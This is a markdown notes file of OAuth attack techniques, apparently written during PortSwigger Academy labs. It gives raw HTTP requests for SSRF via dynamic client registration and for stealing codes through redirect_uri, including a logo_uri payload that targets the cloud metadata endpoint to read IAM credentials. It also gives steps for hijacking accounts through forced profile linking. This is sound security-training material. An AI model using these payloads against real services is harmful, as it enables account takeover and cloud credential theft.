# OAuth Vulnerabilities
## 1. Authentication bypass via OAuth implicit flow
When we get the token from the OAuth provider, this token along with the username/email would get passed to Client Application.<br>
Change the userid/email keeping the token same and repeat this request in repeater.<br>
If don't get any error and session idenfitiers are provided by the client app means it was vulnerable(Show response in browser).

## 2. SSRF via OpenID Dyanmic Registration
Login into the application via OAuth and notice the /logo endpoint getting called from client app. Send it to repeater, say Request1.
```
GET /client/3Li31gSjU7n40abUrahrS/logo HTTP/2
Host: oauth-0a3e00f20357be6180355235028c00f9.oauth-server.net
Cookie: _session=nXDGC6PCxKICUSaaMRc5J; _session.legacy=nXDGC6PCxKICUSaaMRc5J
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0
Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://oauth-0a3e00f20357be6180355235028c00f9.oauth-server.net/interaction/BrzOrqz0BxE_hCtiYbXxs
Sec-Fetch-Dest: image
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: same-origin
Priority: u=4, i
Te: trailers
```
We will need to find out confuguration file. Mostly the OAuth contains a well known endpoint as:
```
https://SERVER.com/.well-known/openid-configuration
```
Search for registration keyword and copy the registration endpoint URL. We will need to craft a POST request with required parameter to see if the OAuth provider accepts dynamic registration.
```
POST /reg HTTP/2
Host: oauth-0a3e00f20357be6180355235028c00f9.oauth-server.net
Content-Type: application/json
Accept: application/json
Content-Length: 158

{
"redirect_uris": [
        "https://client-app.com/callback"
],
"logo_uri": "http://BURP_URL"
}
```
Ref: https://portswigger.net/web-security/oauth/openid<br>
Now repeat Request1 and dont forget to replace the clientId in the URL of Request1 which we get from hitting /reg endpoint. It will try to logo from "logo_uri" endpoint.
If you see hit on colloborator then it is SSRF. You can extract the meta data endpoint credentials as welll using this.
```
POST /reg HTTP/2
Host: oauth-0a3e00f20357be6180355235028c00f9.oauth-server.net
Content-Type: application/json
Accept: application/json
Content-Length: 158

{
"redirect_uris": [
        "https://client-app.com/callback"
],
"logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
}
```
Now hit the Request1 with appropriate client Id.
## 3. One Click Account takeover CSRF (Forced OAuth Profile Linking)
This vulnerability arises due to the absence of state parameter. The steps to reproduce are:
* Login into the application and click on `Add Social Account`.
* Provide your username and password on OAuth login page and accept the confirmation while intercepting all the request.
```
 GET /oauth-linking?code=uqIFPtPr2h3TO8iIkGDhJG5d4RVMTZvL1utfgXmj1UM HTTP/2
Host: 0aad00a404578a9b800203e400c20056.web-security-academy.net
Cookie: session=0sUgiiTsNIh9Ueb4tNecrQNdBFRKZxPe
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://oauth-0a8600ba04f48a4680b3015102890056.oauth-server.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers 
````
* Drop the above request and send this request to victim.
* Once victim clicks on the link his account would be linked with your gmail account and you can access his account via OAuth login.
## 4. Account Hijacking via redirect_uri
In this attack, we will steal the `code` value that is provided by OAuth server after successfull authentication. The steps to reproduce are:
* Login with your social media account in the application and provide the consent. Below are the two requests you will notice.
Request 1 (Initial request while we click on login via google or something):
```
GET /auth?client_id=pjvrmyg30mxmuf7jgzpco&redirect_uri=https://0a25007c03cf320180bc3fca001d00d3.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email HTTP/2
Host: oauth-0ab000ba034d324980dc3d72025800c1.oauth-server.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a25007c03cf320180bc3fca001d00d3.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Priority: u=0, i
Te: trailers
Connection: keep-alive
```
Request 2 which contains code value and used to get the session identifiers from application server
```
GET /oauth-callback?code=RvyOZxEyvTvr74-6DlUSDbhppnz1Bwn6mPZxXfPna-c HTTP/2
Host: 0a25007c03cf320180bc3fca001d00d3.web-security-academy.net
Cookie: session=LG0xHOTr40VfuDnLbkus4yNGLAaAmJyO
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://oauth-0ab000ba034d324980dc3d72025800c1.oauth-server.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```
* In the Request 1 replace redirect_uri with your attacker server and when the victim user who is already logged in clicks on the link then the code value would sent to our attacker server.
* Use the code value in incoginto as shown in Request 2 and you will be logged in as victim account.
